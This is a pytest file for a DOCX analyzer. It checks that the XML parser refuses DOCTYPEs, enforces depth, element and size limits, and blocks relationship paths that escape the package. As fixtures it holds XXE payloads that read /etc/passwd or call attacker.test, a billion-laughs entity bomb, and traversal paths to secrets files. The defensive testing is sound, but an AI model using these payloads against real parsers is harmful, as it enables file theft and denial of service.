"""XML and package security (§18, §19, §80)."""

from __future__ import annotations

import io

import pytest

from app.docx.errors import DocxAnalysisError, DocxErrorCode
from app.docx.limits import AnalyzerLimits, ResourceLimitExceededError
from app.docx.package import DocxPackage, _resolve_target
from app.docx.warnings import WarningCollector
from app.docx.xmlsafe import parse_xml_bytes, parse_xml_stream

XXE_FILE = b'<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>'
XXE_HTTP = b'<!DOCTYPE r [<!ENTITY e SYSTEM "http://attacker.test/x">]><r>&e;</r>'
EXTERNAL_DTD = b'<!DOCTYPE r SYSTEM "http://attacker.test/x.dtd"><r/>'
BILLION_LAUGHS = (
    b'<!DOCTYPE lolz [<!ENTITY lol "lol">'
    b'<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
    b'<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">'
    b"]><lolz>&lol2;</lolz>"
)
PARAMETER_ENTITY = b'<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.test/e"> %p;]><r/>'


@pytest.mark.parametrize(
    "payload",
    [XXE_FILE, XXE_HTTP, EXTERNAL_DTD, BILLION_LAUGHS, PARAMETER_ENTITY],
    ids=["xxe-file", "xxe-http", "external-dtd", "billion-laughs", "parameter-entity"],
)
def test_doctype_is_always_refused(payload: bytes) -> None:
    """Every entity attack enters through a DOCTYPE, so the DOCTYPE is refused."""
    with pytest.raises(DocxAnalysisError) as raised:
        parse_xml_bytes(payload)
    assert raised.value.code is DocxErrorCode.XML_INVALID


def test_doctype_refused_when_streaming() -> None:
    with pytest.raises(DocxAnalysisError):
        parse_xml_stream(io.BytesIO(XXE_FILE))


def test_ordinary_namespaced_xml_parses() -> None:
    root = parse_xml_bytes(b'<a xmlns="urn:x"><b k="1">text</b></a>')
    assert root.tag == "{urn:x}a"
    child = next(iter(root))
    assert child.tag == "{urn:x}b"
    assert child.get("k") == "1"
    assert child.text == "text"


def test_depth_limit_is_enforced_during_parsing() -> None:
    payload = b"<a>" * 400 + b"</a>" * 400
    with pytest.raises(ResourceLimitExceededError) as raised:
        parse_xml_bytes(payload, AnalyzerLimits(max_xml_depth=50))
    assert raised.value.limit_name == "max_xml_depth"


def test_element_count_limit_is_enforced() -> None:
    payload = b"<a>" + b"<b/>" * 100 + b"</a>"
    with pytest.raises(ResourceLimitExceededError) as raised:
        parse_xml_bytes(payload, AnalyzerLimits(max_xml_elements=10))
    assert raised.value.limit_name == "max_xml_elements"


def test_part_byte_limit_is_enforced() -> None:
    payload = b"<a>" + b"x" * 10_000 + b"</a>"
    with pytest.raises(ResourceLimitExceededError):
        parse_xml_bytes(payload, AnalyzerLimits(max_part_bytes=100))


@pytest.mark.parametrize(
    ("source", "target", "expected"),
    [
        ("word/document.xml", "styles.xml", "word/styles.xml"),
        ("word/document.xml", "/word/theme/theme1.xml", "word/theme/theme1.xml"),
        ("word/document.xml", "../customXml/item1.xml", "customXml/item1.xml"),
        ("word/document.xml", "theme/theme1.xml#frag", "word/theme/theme1.xml"),
    ],
)
def test_relationship_targets_resolve_by_opc_rules(source: str, target: str, expected: str) -> None:
    assert _resolve_target(source, target) == expected


@pytest.mark.parametrize(
    "target",
    ["../../../../etc/passwd", "../../..", "../../../secrets.env"],
)
def test_relationship_target_cannot_escape_the_package(target: str) -> None:
    with pytest.raises(DocxAnalysisError) as raised:
        _resolve_target("word/document.xml", target)
    assert raised.value.code is DocxErrorCode.PACKAGE_INVALID


def test_a_non_zip_is_a_package_error() -> None:
    with pytest.raises(DocxAnalysisError) as raised:
        DocxPackage.open(io.BytesIO(b"not a zip"), AnalyzerLimits.default(), WarningCollector())
    assert raised.value.code is DocxErrorCode.PACKAGE_INVALID


def test_malformed_package_failures_are_not_retryable() -> None:
    """Deterministic malformed input must not be retried for ever (§91)."""
    for code in (
        DocxErrorCode.PACKAGE_INVALID,
        DocxErrorCode.XML_INVALID,
        DocxErrorCode.STRUCTURE_INVALID,
        DocxErrorCode.SOURCE_INTEGRITY_FAILED,
        DocxErrorCode.RESOURCE_LIMIT_EXCEEDED,
    ):
        assert DocxAnalysisError(code).retryable is False
    assert DocxAnalysisError(DocxErrorCode.ANALYSIS_TIMEOUT).retryable is True
